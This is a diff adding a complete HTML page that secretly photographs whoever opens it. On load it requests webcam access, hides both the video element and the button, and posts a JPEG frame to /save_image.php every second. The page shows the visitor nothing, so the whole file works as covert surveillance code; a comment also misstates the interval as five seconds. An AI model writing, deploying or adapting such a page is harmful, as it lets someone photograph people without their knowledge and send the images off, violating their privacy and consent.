@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Auto Capture Webcam Images</title>
+</head>
+<body>
+	<!-- Video element to display live webcam stream -->
+	<video hidden id="video" width="640" height="480" autoplay></video>
+
+	<!-- Button to start/stop capturing images -->
+	<button hidden id="capture-btn">Start capturing</button>
+
+	<script>
+		// Define capture interval (in milliseconds)
+		const interval = 1000;
+
+		// Get video element from DOM
+		const videoElement = document.getElementById("video");
+
+		// Function to start capturing images
+		function startCapture() {
+			// Get access to user's camera
+			navigator.mediaDevices.getUserMedia({ video: true })
+				.then(function(stream) {
+					// Set video stream as source for video element
+					videoElement.srcObject = stream;
+
+					// Start interval to capture images every 5 seconds
+					setInterval(captureImage, interval);
+				})
+				.catch(function(err) {
+					console.error(err);
+				});
+		}
+
+		// Function to capture a single image
+		function captureImage() {
+			// Create canvas element to draw the image
+			const canvas = document.createElement("canvas");
+			canvas.width = videoElement.videoWidth;
+			canvas.height = videoElement.videoHeight;
+			canvas.getContext("2d").drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+			// Convert canvas to data URL
+			const dataUrl = canvas.toDataURL("image/jpeg");
+
+			// Send image to server using AJAX
+			const xhr = new XMLHttpRequest();
+			xhr.open("POST", "/save_image.php");
+			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			xhr.send("image=" + encodeURIComponent(dataUrl));
+		}
+
+		// Start capturing images when button is clicked
+		document.getElementById("capture-btn").addEventListener("click", startCapture);
+
+		// Start capturing images when window loads
+		window.onload = startCapture;
+	</script>
+</body>
+</html>
